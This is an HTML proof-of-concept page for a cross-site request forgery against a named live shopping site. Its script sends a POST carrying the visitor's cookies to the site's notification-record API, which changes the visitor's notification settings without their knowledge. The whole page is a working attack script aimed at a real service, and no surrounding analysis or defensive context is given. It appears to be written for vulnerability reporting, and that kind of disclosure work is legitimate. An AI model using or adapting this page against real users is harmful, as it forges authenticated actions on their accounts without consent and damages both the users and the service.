<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CSRF PoC - Temu Notifications Record</title>
</head>
<body>
  <h2>CSRF PoC - Record Notification</h2>
  <button onclick="sendCSRF()">Submit CSRF Request</button>
  <div id="result" style="margin-top: 20px; color: red;"></div>

  <script>
    function sendCSRF() {
      const payload = {
        id: 2,
        type: 3,
        status: 0
      };

      fetch("https://www.temu.com/api/bg/lome/user/notifications/record", {
        method: "POST",
        credentials: "include", // critical for sending cookies
        headers: {
          "Content-Type": "application/json;charset=UTF-8"
        },
        body: JSON.stringify(payload)
      })
      .then(response => response.text().then(text => {
        document.getElementById("result").innerText = 
          response.ok ? "✅ CSRF request sent successfully." : `❌ Request failed: ${text}`;
      }))
      .catch(err => {
        document.getElementById("result").innerText = "⚠️ Error: " + err;
      });
    }
  </script>
</body>
</html>
